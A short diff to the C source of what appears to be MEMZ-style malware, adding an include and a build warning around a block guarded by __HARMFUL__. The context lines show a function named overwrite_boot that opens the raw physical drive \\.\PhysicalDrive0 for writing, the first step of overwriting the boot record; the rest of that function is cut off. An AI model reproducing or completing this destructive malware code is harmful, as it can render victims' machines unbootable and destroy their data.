@@ -1,11 +1,10 @@
+#include <memz/def.h>
 #include <memz/payload.h>
 #include <memz/payload_function.h>
 #include <memz/overwatch.h>
 #include <memz/data.h>
-
 #include <Windows.h>
 #include <string.h>
-
 
 void notepad_alert()
 {
@@ -23,6 +22,7 @@ void notepad_alert()
 }
 
 #ifdef __HARMFUL__
+#warning "BUILDING __HARMFUL__ CODE"
 void overwrite_boot() // DANGER
 {
     HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
